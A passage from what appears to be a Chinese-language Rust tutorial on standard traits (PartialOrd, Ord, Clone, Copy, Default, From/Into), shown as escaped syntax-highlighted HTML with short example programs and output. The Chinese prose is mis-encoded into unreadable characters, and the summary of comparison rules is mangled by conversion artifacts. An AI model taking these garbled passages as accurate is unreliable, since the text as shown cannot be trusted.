&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">me&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="n">partial_cmp&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">other&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w"> &lt;/span>&lt;span class="p">}&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="k">else&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="k">if&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="kd">let&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">Man&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">me&lt;/span>&lt;span class="p">),&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">Man&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">other&lt;/span>&lt;span class="p">))&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="bp">self&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">other&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="p">{&lt;/span>&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w"> &lt;/span>&lt;span class="c1">// Man åªå’Œ Man ç›¸æ¯”è¾ƒ
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">me&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="n">partial_cmp&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">other&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w"> &lt;/span>&lt;span class="p">}&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="k">else&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="p">{&lt;/span>&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w"> &lt;/span>&lt;span class="c1">// å…¶ä»–æƒ…å†µä¸æ”¯æŒæ¯”è¾ƒæ“ä½œï¼Œæ¯”è¾ƒæ—¶ä¼šç›´æ¥è¿”å› false
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="nb">None&lt;/span>&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w"> &lt;/span>&lt;span class="p">}&lt;/span>&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w"> &lt;/span>&lt;span class="p">}&lt;/span>&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w">&lt;/span>&lt;span class="p">}&lt;/span>&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w">&lt;/span>&lt;span class="kd">let&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">man1&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">man2&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">Man&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="mi">20&lt;/span>&lt;span class="p">),&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">Man&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="mi">30&lt;/span>&lt;span class="p">));&lt;/span>&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w">&lt;/span>&lt;span class="kd">let&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">dog1&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">dog2&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">Dog&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="mi">2&lt;/span>&lt;span class="p">),&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">Dog&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="mi">3&lt;/span>&lt;span class="p">));&lt;/span>&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w">&lt;/span>&lt;span class="fm">dbg!&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">man2&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="o">&amp;gt;&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">man1&lt;/span>&lt;span class="p">);&lt;/span>&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w">&lt;/span>&lt;span class="fm">dbg!&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">dog2&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="o">&amp;gt;&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">dog1&lt;/span>&lt;span class="p">);&lt;/span>&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w">&lt;/span>&lt;span class="fm">dbg!&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">man1&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="o">&amp;gt;&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">dog1&lt;/span>&lt;span class="p">);&lt;/span>&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w">&lt;/span>&lt;span class="fm">dbg!&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">man1&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="n">partial_cmp&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="o">&amp;amp;&lt;/span>&lt;span class="n">dog1&lt;/span>&lt;span class="p">));&lt;/span>&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;span class="lnt">3
&lt;/span>&lt;span class="lnt">4
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-text" data-lang="text">&lt;span class="line">&lt;span class="cl">[src/main.rs:29] man2 &amp;gt; man1 = true
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">[src/main.rs:30] dog2 &amp;gt; dog1 = true
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">[src/main.rs:31] man1 &amp;gt; dog1 = false
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">[src/main.rs:32] man1.partial_cmp(&amp;amp;dog1) = None
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>ä¸Šé¢çš„è¾“å‡ºè¯´æ˜ï¼š&lt;/p>
&lt;ul>
&lt;li>&lt;code>Man&lt;/code> ä¹‹é—´æ˜¯å¯ä»¥è¿›è¡Œæ¯”è¾ƒçš„&lt;/li>
&lt;li>&lt;code>Man&lt;/code> å’Œ &lt;code>Dog&lt;/code> ä¹‹é—´ä¸å¯æ¯”ï¼Œå¦‚æœè¿›è¡Œæ¯”è¾ƒåªä¼šè¿”å› &lt;code>false&lt;/code> æˆ–è€… &lt;code>None&lt;/code>, å–å†³äºä½¿ç”¨çš„æ˜¯è¿ç®—ç¬¦è¿˜æ˜¯æ–¹æ³•è°ƒç”¨ã€‚&lt;/li>
&lt;/ul>
&lt;p>æ€»ç»“ä¸€ä¸‹ï¼Œä¸¤ä¸ªå€¼ä¹‹é—´çš„æ¯”è¾ƒï¼Œéµå¾ªå¦‚ä¸‹è§„åˆ™ï¼š&lt;/p>
&lt;ul>
&lt;li>å½“ä¸”ä»…å½“ &lt;code>partial_cmp(a, b) =&lt;/code> Some(Equal)= æ—¶ï¼Œ &lt;code>a == b&lt;/code>&lt;/li>
&lt;li>å½“ä¸”ä»…å½“ &lt;code>partial_cmp(a, b) =&lt;/code> Some(Less)= æ—¶ï¼Œ &lt;code>a &amp;lt; b&lt;/code>&lt;/li>
&lt;li>å½“ä¸”ä»…å½“ &lt;code>partial_cmp(a, b) =&lt;/code> Some(Greater)= æ—¶ï¼Œ &lt;code>a &amp;gt; b&lt;/code>&lt;/li>
&lt;li>å½“ä¸”ä»…å½“ &lt;code>a &amp;lt; b || a â€‹=&lt;/code>â€‹= b= æ—¶ï¼Œ &lt;code>a &amp;lt;= b&lt;/code>&lt;/li>
&lt;li>å½“ä¸”ä»…å½“ &lt;code>a &amp;gt; b || a â€‹=&lt;/code>â€‹= b= æ—¶ï¼Œ &lt;code>a &amp;gt;= b&lt;/code>&lt;/li>
&lt;li>å½“ä¸”ä»…å½“ &lt;code>!(a â€‹=&lt;/code>â€‹= b)= æ—¶ï¼Œ &lt;code>a != b&lt;/code>&lt;/li>
&lt;/ul>
&lt;h4 id="ord-æ„å‘³ç€ä»»æ„ä¸¤ä¸ªå€¼ä¹‹é—´éƒ½å­˜åœ¨æœ‰æ•ˆçš„é¡ºåº">&lt;code>Ord&lt;/code> æ„å‘³ç€ä»»æ„ä¸¤ä¸ªå€¼ä¹‹é—´éƒ½å­˜åœ¨æœ‰æ•ˆçš„é¡ºåº&lt;/h4>
&lt;p>&lt;code>Ord&lt;/code> çš„ç”¨æ³•å’Œ &lt;code>PartialOrd&lt;/code> ç±»ä¼¼ï¼Œåªä¸è¿‡è¿”å›çš„ç›´æ¥å°±æ˜¯ä¸€ä¸ª &lt;code>Ordering&lt;/code>, è€Œé
&lt;code>Option&amp;lt;Ordering&amp;gt;&lt;/code>, è¿™é‡Œä¸å†ä¸¾ä¾‹è¯´æ˜ã€‚&lt;/p>
&lt;p>ç‰¹æ®Šåº”ç”¨åœºæ™¯ï¼š&lt;/p>
&lt;ul>
&lt;li>&lt;code>BTreeSet&amp;lt;T&amp;gt;&lt;/code> éœ€è¦å…¶å­˜å‚¨çš„å€¼å®ç° &lt;code>Ord&lt;/code> traitã€‚&lt;/li>
&lt;/ul>
&lt;h3 id="clone-copy">&lt;code>Clone&lt;/code>, &lt;code>Copy&lt;/code>&lt;/h3>
&lt;ul>
&lt;li>&lt;code>Clone&lt;/code> å¯ç”¨äºå®ç°å€¼çš„æ·±æ‹·è´ (deep copy), è¿‡ç¨‹å¯èƒ½æ¶‰åŠå¯¹å †æ•°æ®çš„æ‹·è´ã€‚&lt;/li>
&lt;li>å®ç° &lt;code>Copy&lt;/code> trait çš„ç±»å‹â€‹&lt;strong>å¿…é¡»åŒæ—¶å®ç° &lt;code>Clone&lt;/code> trait&lt;/strong> ã€‚å®ƒä»¬æ‰§è¡Œçš„æ˜¯åŒæ ·çš„ä»»åŠ¡ï¼Œåªæ˜¯å®ç° &lt;code>Copy&lt;/code> trait æ„å‘³ç€ï¼š
&lt;ol>
&lt;li>æ‹·è´è¿‡ç¨‹æˆæœ¬ä½ï¼Œé€Ÿåº¦å¿«ï¼ˆè¯­æ„å±‚é¢ï¼‰ã€‚&lt;/li>
&lt;li>èµ‹å€¼æˆ–ä¼ å‚æ—¶æ— éœ€æ˜¾å¼è°ƒç”¨ &lt;code>clone&lt;/code> æ–¹æ³•ï¼ˆè¯­æ³•å±‚é¢ï¼‰ã€‚&lt;/li>
&lt;/ol>
&lt;/li>
&lt;li>ä¸€ä¸ªç»“æ„å¦‚æœè¦ derive &lt;code>Copy&lt;/code> trait, è¦æ±‚å…¶å­—æ®µéƒ½å¿…é¡»å®ç°äº† &lt;code>Copy&lt;/code> traitã€‚&lt;/li>
&lt;/ul>
&lt;p>ç‰¹æ®Šåº”ç”¨åœºæ™¯ï¼š&lt;/p>
&lt;ul>
&lt;li>è°ƒç”¨ slice çš„ &lt;code>to_vec&lt;/code> æ–¹æ³•è¦æ±‚å…¶å­˜å‚¨çš„å€¼å®ç° &lt;code>Clone&lt;/code> traitã€‚&lt;/li>
&lt;/ul>
&lt;p>åœ¨â€œ&lt;a href="https://mincodes.com/posts/traits-in-rust/#trait-%E5%92%8C%E6%89%80%E6%9C%89%E6%9D%83--ownership">Trait å’Œç”Ÿå‘½å‘¨æœŸ&lt;/a>â€ä¸­æˆ‘ä»¬ä¼šå†æ¬¡æåˆ° &lt;code>Copy&lt;/code> traitã€‚&lt;/p>
&lt;h3 id="hash">&lt;code>Hash&lt;/code>&lt;/h3>
&lt;p>ä¸»è¦åœ¨å“ˆå¸Œè¡¨ä¸­åº”ç”¨, &lt;code>HashMap&amp;lt;K, V&amp;gt;&lt;/code> è¦æ±‚ key å€¼å®ç° &lt;code>Hash&lt;/code> traitã€‚&lt;/p>
&lt;h3 id="default">&lt;code>Default&lt;/code>&lt;/h3>
&lt;p>&lt;code>Default&lt;/code> trait å…è®¸ä»¥ä¸€ç§æƒ¯ç”¨çš„æ–¹å¼åˆ›å»ºç±»å‹çš„é»˜è®¤å€¼ã€‚&lt;/p>
&lt;p>ç‰¹æ®Šåº”ç”¨åœºæ™¯ï¼š&lt;/p>
&lt;ul>
&lt;li>åœ¨ç»“æ„ä½“æ›´æ–°è¯­æ³•ä¸­ä½¿ç”¨ï¼š &lt;code>..Default::default()&lt;/code>&lt;/li>
&lt;li>&lt;code>Option&amp;lt;T&amp;gt;.unwrap_or_default&lt;/code> æ–¹æ³•è¦æ±‚ &lt;code>T&lt;/code> ç±»å‹å®ç° &lt;code>Default&lt;/code> trait&lt;/li>
&lt;/ul>
&lt;p>ä¸‹é¢æ¼”ç¤ºäº†å¦‚ä½•åœ¨ç»“æ„ä½“æ›´æ–°è¯­æ³•ä¸­ä½¿ç”¨ &lt;code>Default&lt;/code> trait æä¾›çš„èƒ½åŠ›ï¼š&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
&lt;/span>&lt;span class="lnt"> 2
&lt;/span>&lt;span class="lnt"> 3
&lt;/span>&lt;span class="lnt"> 4
&lt;/span>&lt;span class="lnt"> 5
&lt;/span>&lt;span class="lnt"> 6
&lt;/span>&lt;span class="lnt"> 7
&lt;/span>&lt;span class="lnt"> 8
&lt;/span>&lt;span class="lnt"> 9
&lt;/span>&lt;span class="lnt">10
&lt;/span>&lt;span class="lnt">11
&lt;/span>&lt;span class="lnt">12
&lt;/span>&lt;span class="lnt">13
&lt;/span>&lt;span class="lnt">14
&lt;/span>&lt;span class="lnt">15
&lt;/span>&lt;span class="lnt">16
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-rust" data-lang="rust">&lt;span class="line">&lt;span class="cl">&lt;span class="c1">// é€šè¿‡ derive æŒ‡ä»¤è‡ªåŠ¨è·å¾— Debug, Clone å’Œ Default trait
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span>&lt;span class="cp">#[derive(Debug, Clone, Default)]&lt;/span>&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w">&lt;/span>&lt;span class="k">struct&lt;/span> &lt;span class="nc">Rect&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="p">{&lt;/span>&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w"> &lt;/span>&lt;span class="n">left&lt;/span>: &lt;span class="kt">u32&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w"> &lt;/span>&lt;span class="n">right&lt;/span>: &lt;span class="kt">u32&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w"> &lt;/span>&lt;span class="n">top&lt;/span>: &lt;span class="kt">u32&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w"> &lt;/span>&lt;span class="n">bottom&lt;/span>: &lt;span class="kt">u32&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w">&lt;/span>&lt;span class="p">}&lt;/span>&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w">&lt;/span>&lt;span class="kd">let&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">r1&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">Rect&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="p">{&lt;/span>&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w"> &lt;/span>&lt;span class="n">right&lt;/span>: &lt;span class="mi">10&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w"> &lt;/span>&lt;span class="n">bottom&lt;/span>: &lt;span class="mi">10&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w"> &lt;/span>&lt;span class="o">..&lt;/span>&lt;span class="nb">Default&lt;/span>::&lt;span class="n">default&lt;/span>&lt;span class="p">()&lt;/span>&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w">&lt;/span>&lt;span class="p">};&lt;/span>&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w">&lt;/span>&lt;span class="fm">dbg!&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">r1&lt;/span>&lt;span class="p">);&lt;/span>&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;span class="lnt">3
&lt;/span>&lt;span class="lnt">4
&lt;/span>&lt;span class="lnt">5
&lt;/span>&lt;span class="lnt">6
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-text" data-lang="text">&lt;span class="line">&lt;span class="cl">[src/main.rs:18] r1 = Rect {
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> left: 0,
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> right: 10,
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> top: 0,
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> bottom: 10,
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">}
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;h2 id="trait-å’Œç±»å‹è½¬æ¢">Trait å’Œç±»å‹è½¬æ¢&lt;/h2>
&lt;h3 id="from-å’Œ-into">&lt;code>From&lt;/code> å’Œ &lt;code>Into&lt;/code>&lt;/h3>
&lt;p>&lt;code>From&lt;/code> å’Œ &lt;code>Int&lt;/code> trait è§„å®šäº†ä¸€ç§æƒ¯ç”¨çš„ç±»å‹è½¬æ¢æ–¹å¼ã€‚å®ç°äº† &lt;code>From&lt;/code>, å°±å¯ä»¥â€œå…è´¹â€è·å¾—
&lt;code>Into&lt;/code>:&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
&lt;/span>&lt;span class="lnt"> 2
&lt;/span>&lt;span class="lnt"> 3
&lt;/span>&lt;span class="lnt"> 4
&lt;/span>&lt;span class="lnt"> 5
&lt;/span>&lt;span class="lnt"> 6
&lt;/span>&lt;span class="lnt"> 7
&lt;/span>&lt;span class="lnt"> 8
&lt;/span>&lt;span class="lnt"> 9
&lt;/span>&lt;span class="lnt">10
&lt;/span>&lt;span class="lnt">11
&lt;/span>&lt;span class="lnt">12
&lt;/span>&lt;span class="lnt">13
&lt;/span>&lt;span class="lnt">14
&lt;/span>&lt;span class="lnt">15
&lt;/span>&lt;span class="lnt">16
&lt;/span>&lt;span class="lnt">17
&lt;/span>&lt;span class="lnt">18
&lt;/span>&lt;span class="lnt">19
&lt;/span>&lt;span class="lnt">20
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-rust" data-lang="rust">&lt;span class="line">&lt;span class="cl">&lt;span class="k">use&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">std&lt;/span>::&lt;span class="n">convert&lt;/span>::&lt;span class="nb">From&lt;/span>&lt;span class="p">;&lt;/span>&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w">&lt;/span>&lt;span class="cp">#[derive(Debug)]&lt;/span>&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w">&lt;/span>&lt;span class="k">struct&lt;/span> &lt;span class="nc">Number&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="p">{&lt;/span>&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w"> &lt;/span>&lt;span class="n">value&lt;/span>: &lt;span class="kt">i32&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w">&lt;/span>&lt;span class="p">}&lt;/span>&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w">&lt;/span>&lt;span class="k">impl&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="nb">From&lt;/span>&lt;span class="o">&amp;lt;&lt;/span>&lt;span class="kt">i32&lt;/span>&lt;span class="o">&amp;gt;&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="k">for&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">Number&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="p">{&lt;/span>&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w"> &lt;/span>&lt;span class="k">fn&lt;/span> &lt;span class="nf">from&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">item&lt;/span>: &lt;span class="kt">i32&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="w"> &lt;/span>-&amp;gt; &lt;span class="nc">Self&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="p">{&lt;/span>&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w"> &lt;/span>&lt;span class="n">Number&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="p">{&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">value&lt;/span>: &lt;span class="nc">item&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="p">}&lt;/span>&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w"> &lt;/span>&lt;span class="p">}&lt;/span>&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w">&lt;/span>&lt;span class="p">}&lt;/span>&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w">&lt;/span>&lt;span class="k">fn&lt;/span> &lt;span class="nf">main&lt;/span>&lt;span class="p">()&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="p">{&lt;/span>&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w"> &lt;/span>&lt;span class="kd">let&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">num&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">Number&lt;/span>::&lt;span class="n">from&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="mi">30&lt;/span>&lt;span class="p">);&lt;/span>&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w"> &lt;/span>&lt;span class="fm">println!&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s">&amp;#34;My number is &lt;/span>&lt;span class="si">{:?}&lt;/span>&lt;span class="s">&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">num&lt;/span>&lt;span class="p">);&lt;/span>&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w"> &lt;/span>&lt;span class="kd">let&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">num&lt;/span>: &lt;span class="nc">Number&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="mf">40.&lt;/span>&lt;span class="n">into&lt;/span>&lt;span class="p">();&lt;/span>&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w"> &lt;/span>&lt;span class="fm">println!&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s">&amp;#34;My number is &lt;/span>&lt;span class="si">{:?}&lt;/span>&lt;span class="s">&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">num&lt;/span>&lt;span class="p">);&lt;/span>&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w">&lt;/span>&lt;span class="p">}&lt;/span>&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;h3 id="tryfrom-å’Œ-tryinto">&lt;code>TryFrom&lt;/code> å’Œ &lt;code>TryInto&lt;/code>&lt;/h3>
&lt;p>å’Œ &lt;code>From&lt;/code>, &lt;code>Into&lt;/code> ç±»ä¼¼ï¼Œåªä¸è¿‡è¿”å›çš„æ˜¯ &lt;code>Result&lt;/code>:&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
&lt;/span>&lt;span class="lnt"> 2
&lt;/span>&lt;span class="lnt"> 3
&lt;/span>&lt;span class="lnt"> 4
&lt;/span>&lt;span class="lnt"> 5
&lt;/span>&lt;span class="lnt"> 6
&lt;/span>&lt;span class="lnt"> 7
&lt;/span>&lt;span class="lnt"> 8
&lt;/span>&lt;span class="lnt"> 9
&lt;/span>&lt;span class="lnt">10
&lt;/span>&lt;span class="lnt">11
&lt;/span>&lt;span class="lnt">12
&lt;/span>&lt;span class="lnt">13
&lt;/span>&lt;span class="lnt">14
